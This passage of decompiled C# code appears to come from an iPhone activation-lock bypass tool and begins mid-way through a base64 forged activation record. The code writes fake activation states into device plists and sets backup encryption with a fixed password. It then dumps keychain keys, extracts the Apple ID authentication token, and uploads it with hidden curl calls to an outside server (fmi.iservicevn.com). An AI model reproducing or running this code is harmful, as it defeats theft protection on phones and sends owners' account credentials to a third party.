WVFZDMHRMUzB0Cgk8L2RhdGE+Cgk8a2V5PkRldmljZUlEPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PlNlcmlhbE51bWJlcjwva2V5PgoJCTxzdHJpbmc+RlIxUDJHSDhKOFhIPC9zdHJpbmc+CgkJPGtleT5VbmlxdWVEZXZpY2VJRDwva2V5PgoJCTxzdHJpbmc+ZDk4OTIwOTZjZjM0MTFlYTg3ZDAwMjQyYWMxMzAwMDNmMzQxMWU0Mjwvc3RyaW5nPgoJPC9kaWN0PgoJPGtleT5EZXZpY2VJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkJ1aWxkVmVyc2lvbjwva2V5PgoJCTxzdHJpbmc+MThGMDA8L3N0cmluZz4KCQk8a2V5PkRldmljZUNsYXNzPC9rZXk+CgkJPHN0cmluZz5pUGhvbmU8L3N0cmluZz4KCQk8a2V5PkRldmljZVZhcmlhbnQ8L2tleT4KCQk8c3RyaW5nPkI8L3N0cmluZz4KCQk8a2V5Pk1vZGVsTnVtYmVyPC9rZXk+CgkJPHN0cmluZz5NTExOMjwvc3RyaW5nPgoJCTxrZXk+T1NUeXBlPC9rZXk+CgkJPHN0cmluZz5pUGhvbmUgT1M8L3N0cmluZz4KCQk8a2V5PlByb2R1Y3RUeXBlPC9rZXk+CgkJPHN0cmluZz5pUGhvbmUwLDA8L3N0cmluZz4KCQk8a2V5PlByb2R1Y3RWZXJzaW9uPC9rZXk+CgkJPHN0cmluZz4xNC4wLjA8L3N0cmluZz4KCQk8a2V5PlJlZ2lvbkNvZGU8L2tleT4KCQk8c3RyaW5nPkxMPC9zdHJpbmc+CgkJPGtleT5SZWdpb25JbmZvPC9rZXk+CgkJPHN0cmluZz5MTC9BPC9zdHJpbmc+CgkJPGtleT5SZWd1bGF0b3J5TW9kZWxOdW1iZXI8L2tleT4KCQk8c3RyaW5nPkExMjM0PC9zdHJpbmc+CgkJPGtleT5TaWduaW5nRnVzZTwva2V5PgoJCTx0cnVlLz4KCQk8a2V5PlVuaXF1ZUNoaXBJRDwva2V5PgoJCTxpbnRlZ2VyPjEyMzQ1Njc4OTEyMzQ8L2ludGVnZXI+Cgk8L2RpY3Q+Cgk8a2V5PlJlZ3VsYXRvcnlJbWFnZXM8L2tleT4KCTxkaWN0PgoJCTxrZXk+RGV2aWNlVmFyaWFudDwva2V5PgoJCTxzdHJpbmc+Qjwvc3RyaW5nPgoJPC9kaWN0PgoJPGtleT5Tb2Z0d2FyZVVwZGF0ZVJlcXVlc3RJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkVuYWJsZWQ8L2tleT4KCQk8dHJ1ZS8+Cgk8L2RpY3Q+Cgk8a2V5PlVJS0NlcnRpZmljYXRpb248L2tleT4KCTxkaWN0PgoJCTxrZXk+Qmx1ZXRvb3RoQWRkcmVzczwva2V5PgoJCTxzdHJpbmc+ZmY6ZmY6ZmY6ZmY6ZmY6ZmY8L3N0cmluZz4KCQk8a2V5PkJvYXJkSWQ8L2tleT4KCQk8aW50ZWdlcj4yPC9pbnRlZ2VyPgoJCTxrZXk+Q2hpcElEPC9rZXk+CgkJPGludGVnZXI+MzI3Njg8L2ludGVnZXI+CgkJPGtleT5FdGhlcm5ldE1hY0FkZHJlc3M8L2tleT4KCQk8c3RyaW5nPmZmOmZmOmZmOmZmOmZmOmZmPC9zdHJpbmc+CgkJPGtleT5VSUtDZXJ0aWZpY2F0aW9uPC9rZXk+CgkJPGRhdGE+CgkJTUlJRDB3SUJBakNDQTh3RUlQNEMzc3FRdFAxUzJod0JaekNvSGNzb0gyeE51NWMrYTRRNDVvSjFNS0YzCgkJQkVFRTJlOTNlb1ZPeHVmMGVLUFVxTkVnNnpNbEJzTnEranIrUnFNQXhTaFZBL2NUNW9ua3IwdCtFMEhLCgkJblNkdkhNMi9GZXRyT3FpT0k0RHZIUElEVzBEMnVBUVEzaW9iUHdhQWxGbFhIUFdyOE1KLyt3UVFHVGxuCgkJRVhPMTZOdDJrVUUrdy8vQmxHd1Q4V3hSZXkvSU41SW1NbGtZelpsSnpack83dVl0bHBlZ3k2K3hJaWwyCgkJQjJYbHk0aUd4UlppUld5NXNLcFFvMll6b0pFbW1XU25manUwY1UyL3JiOUZCdnVWaS9rV1NGbkFrdDR5CgkJcVF3NGswaWJ0cDVXK1lVQ0NvZm8zeWVuak0yVWMwbit5SExyU20wRTlPUDNwdExUN3ZHcnJma3IzWFJpCgkJdHdEcGRCT3NzK1h6SEFRWEt1cG85WGkxUW1ObGp1VGoxakpZbzZNc1kyOURYOUVacFdEdmpJc0l5THd4CgkJQjRjbUlTVWY4Qm5yUlFHOURBM01lYzZiaFRkUEJjdUtXZHBCbm5DMlY4V3BmTXBwVUQ2U2RndW5pejZ6CgkJTEcwNmNGR3dvUXZuWXhRa1Vra2pkWWR6NG85eXM5L3ZxQ2JxZnBuNHRjZEkyMWM5Z29Nd0xoRHNoYms1CgkJUENaQnNoNUY0U1JSaWdBV3JBU0NBejk4MkI3bzhwQ0NaL2pZK3laQ3pBb3J6SG5zR2Z2d0tpSlBBTWppCgkJZTA0RzRqSk04cEpRUU5uWmFhUCt0RmVsZGhER1FubzA0dmZKRFkzOEZGTSthZUN3elJyQy9DUGJrZVpRCgkJNXR5NTdMSXNzMUhyUmUzSTFjK0ZMNXBuZmwvaEsxQjF1QTRHRDRWbFkxU0xMMXk1ajRHdUZUM1hTeHpiCgkJWlIvZmJEa1V5VHNUM3I2eGdoWnRNNEJYSW9hNjJaREMzSVBtT2J4S2JobGFLQTRtSzJzM1FCNFZjNlMvCgkJbTZ1YTZQakwvQjE1QzBjTGpyMUNNb0x0Lzc4TFVRV21GRXV5SkhkdnRTNnhIbWtMRG9FZW1tMHlDcGJqCgkJMmhrRmt2d3dISlg2SDFiUm1KWS9HUmY1UXVIWDVKdlk3ZGhOY2YzNENmaVExRHdwZ2VKUkw5eTN2SG0vCgkJZkFSV0JxWDNkWjV1VUpXcUNzMklvMFdIRGdqMTh3cW5vUEw2QnRHcjVhWEJFeGF3WkpGT1ZOcVZjV2lPCgkJOE9LMzhuSDFKaGcxVk44UURBelhmTEpjQ2w0UEN6Mm5sVlpSMDl1WnF0NlpPaXFjVUNyZ3hZbTdIQktaCgkJOS9BRmIyVmxLUFRZTTNueXBDeGh5MmNMQnowK3RCK0V6V0hTbjlzU3FMelN1eFBOdGIxY21FMno5OFNoCgkJMk1UVzJaWk42NWdvYkxrSU5wbzdUb1RBMm50cHY1ZjBqdlhpVnZIV1V1dmhUSVlLZG4vKzA0czNJQ0VLCgkJQVlJQ0NPNjgvakxucDVQUERuRmVsQ3Z1d0dFRTFkb0lMNzZ6UllNOWlrWTJHRVB5NW5XdW1ydXp4U2RCCgkJMURBNnNOeUxQanN2QnBnYUVnWmI0OUpXSjlERU5vYWZKeGQ4dlBoRnpORHZEL0NRKzU4VGtCYmYwWEVLCgkJa2xIRzdzOFY0SkRsYS9jMTBjSDcyWS8wL0lOUi9kUVk1V3FSaHNiSEVFalBVekdDTGNVPQoJCTwvZGF0YT4KCQk8a2V5PldpZmlBZGRyZXNzPC9rZXk+CgkJPHN0cmluZz5mZjpmZjpmZjpmZjpmZjpmZjwvc3RyaW5nPgoJPC9kaWN0Pgo8L2RpY3Q+CjwvcGxpc3Q+";
		try
		{
			nSDictionary.Remove("kPostponementTicket");
		}
		catch
		{
		}
		UpdateProgress(49);
		nSDictionary.Add("kPostponementTicket", new NSDictionary
		{
			{ "ActivationState", "FactoryActivated" },
			{ "ActivationTicket", obj },
			{ "ActivityURL", "https://albert.apple.com/deviceservices/activity" },
			{ "PhoneNumberNotificationURL", "https://albert.apple.com/deviceservices/phoneHome" }
		});
		PropertyListParser.SaveAsXml(nSDictionary, new FileInfo(Recovered_04_0053_Name + "com.apple.commcenter.device_specific_nobackup.plist"));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00b8_Name()
	{
		NSDictionary nSDictionary = (NSDictionary)PropertyListParser.Parse(new FileInfo(Recovered_04_0053_Name + "data_ark.plist"));
		try
		{
			nSDictionary.Remove("-UCRTOOBForbidden");
			nSDictionary.Remove("ActivationState");
			nSDictionary.Remove("-ActivationState");
			nSDictionary.Add("ActivationState", "Activated");
		}
		catch (Exception)
		{
		}
		PropertyListParser.SaveAsXml(nSDictionary, new FileInfo(Recovered_04_0053_Name + "data_ark.plist"));
	}

	public static string Recovered_06_00b9_Name(string P_0)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(P_0);
		return Convert.ToBase64String(bytes);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Recovered_06_00ba_Name(string P_0, string P_1, string P_2)
	{
		if (!P_1.EndsWith(".tgz"))
		{
			P_1 += ".tgz";
		}
		using FileStream baseOutputStream = File.Create(Path.Combine(P_2, P_1));
		using GZipOutputStream outputStream = new GZipOutputStream(baseOutputStream);
		using TarArchive tarArchive = TarArchive.CreateOutputTarArchive(outputStream);
		Recovered_06_00bb_Name(tarArchive, P_0, true);
	}

	private void Recovered_06_00bb_Name(TarArchive P_0, string P_1, bool P_2)
	{
		if (P_2)
		{
			string[] directories = Directory.GetDirectories(P_1);
			string[] array = directories;
			foreach (string text in array)
			{
				Recovered_06_00bb_Name(P_0, text, P_2);
			}
		}
		string[] files = Directory.GetFiles(P_1);
		string[] array2 = files;
		foreach (string fileName in array2)
		{
			TarEntry sourceEntry = TarEntry.CreateEntryFromFile(fileName);
			P_0.WriteEntry(sourceEntry, recurse: true);
		}
	}

	public void Recovered_06_00bc_Name(string P_0, string P_1)
	{
		Stream stream = File.OpenRead(P_0);
		Stream stream2 = new GZipInputStream(stream);
		TarArchive tarArchive = TarArchive.CreateInputTarArchive(stream2);
		tarArchive.ExtractContents(P_1);
		tarArchive.Close();
		stream2.Close();
		stream.Close();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Recovered_06_00bd_Name()
	{
		string requestUriString = "http://iservicevn.com/tmgsm/getfilesact.php?serial=" + DeviceStateRecovered.DeviceSerialNumber;
		HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
		httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
		httpWebRequest.Timeout = 18000;
		using HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
		return streamReader.ReadToEnd();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Recovered_06_00be_Name(NSDictionary P_0, string P_1, int P_2 = 4)
	{
		P_0.TryGetValue(P_1, out var value);
		return Recovered_06_00bf_Name(value.ToXmlPropertyList().ToString(), P_2).Replace("\n", "").Replace("\r", "").Replace("</data>", "")
			.Replace("</plist>", "")
			.Replace("</string>", "")
			.Replace("<string>", "")
			.Trim();
	}

	public string Recovered_06_00bf_Name(string P_0, int P_1)
	{
		return P_0.Split(Environment.NewLine.ToCharArray(), P_1 + 1).Skip(P_1).FirstOrDefault();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Recovered_06_00c0_Name()
	{
		using WebClient webClient = new WebClient();
		webClient.DownloadFile("http://iservicevn.com/tmgsm//Carrier/hash", Recovered_04_0053_Name + "hash");
	}

	public void Recovered_06_00c1_Name()
	{
		if (Directory.Exists(Recovered_04_0053_Name))
		{
			Directory.Delete(Recovered_04_0053_Name, recursive: true);
		}
		Thread.Sleep(600);
		Directory.CreateDirectory(Recovered_04_0053_Name);
	}

	public void Recovered_06_00c2_Name()
	{
		try
		{
			if (Directory.Exists(Recovered_04_0057_Name))
			{
				Directory.Delete(Recovered_04_0057_Name, recursive: true);
			}
			Thread.Sleep(1000);
			Directory.CreateDirectory(Recovered_04_0057_Name);
		}
		catch (Exception)
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00c3_Name()
	{
		using Process process = new Process();
		process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\idevicebackup2.exe";
		process.StartInfo.Arguments = "-i encryption on 1111";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.StandardOutput.ReadToEnd();
		process.WaitForExit();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool Recovered_06_00c4_Name()
	{
		using (Process process = new Process())
		{
			process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\idevicebackup2.exe";
			process.StartInfo.Arguments = "backup " + Recovered_04_0057_Name;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardOutput.ReadToEnd();
			process.WaitForExit();
		}
		string text = "";
		using (Process process2 = new Process())
		{
			process2.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\idevicebackup2.exe";
			process2.StartInfo.Arguments = "state";
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.StartInfo.CreateNoWindow = true;
			process2.Start();
			text = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
		}
		return text.Contains("Activated");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00c5_Name()
	{
		string deviceUDID = DeviceStateRecovered.DeviceUDID;
		using Process process = new Process();
		process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\irestores.exe";
		process.StartInfo.Arguments = Recovered_04_0057_Name + "\\" + deviceUDID + " dumpkeys " + Recovered_04_0057_Name + "\\" + deviceUDID + ".lol";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.StandardOutput.ReadToEnd();
		process.WaitForExit();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00c6_Name()
	{
		string deviceUDID = DeviceStateRecovered.DeviceUDID;
		using Process process = new Process();
		process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\busybox.exe";
		process.StartInfo.Arguments = "grep -A4 -B19 com.apple.gs.idms.pet.com.apple.account.AppleIDAuthentication.token " + Recovered_04_0057_Name + "\\" + deviceUDID + ".lol";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		StreamReader standardOutput = process.StandardOutput;
		string contents = standardOutput.ReadToEnd();
		File.WriteAllText(Recovered_04_0057_Name + "\\" + deviceUDID + ".dump", contents);
		process.WaitForExit();
		if (File.Exists(Recovered_04_0057_Name + "\\" + deviceUDID + ".lol"))
		{
			File.Delete(Recovered_04_0057_Name + "\\" + deviceUDID + ".lol");
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00c7_Name()
	{
		string deviceUDID = DeviceStateRecovered.DeviceUDID;
		string text = "https://fmi.iservicevn.com/fmio/upload.php";
		using Process process = new Process();
		process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\curl.exe";
		process.StartInfo.WorkingDirectory = Recovered_04_0052_Name + "\\vendor\\Backup";
		process.StartInfo.Arguments = "curl -F fileToUpload=@" + deviceUDID + ".dump " + text;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.StandardOutput.ReadToEnd();
		process.WaitForExit();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00c8_Name()
	{
		try
		{
			if (Directory.Exists(Recovered_04_0054_Name + "\\Backup\\"))
			{
				Directory.Delete(Recovered_04_0054_Name + "\\Backup\\", recursive: true);
			}
			Thread.Sleep(1000);
			Directory.CreateDirectory(Recovered_04_0054_Name + "\\Backup\\");
		}
		catch (Exception)
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool Recovered_06_00c9_Name(string P_0)
	{
		bool result = true;
		WebRequest webRequest = WebRequest.Create(P_0);
		webRequest.Timeout = 1200;
		webRequest.Method = "HEAD";
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			result = false;
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public DeviceOperationsRecovered()
	{
	}
}
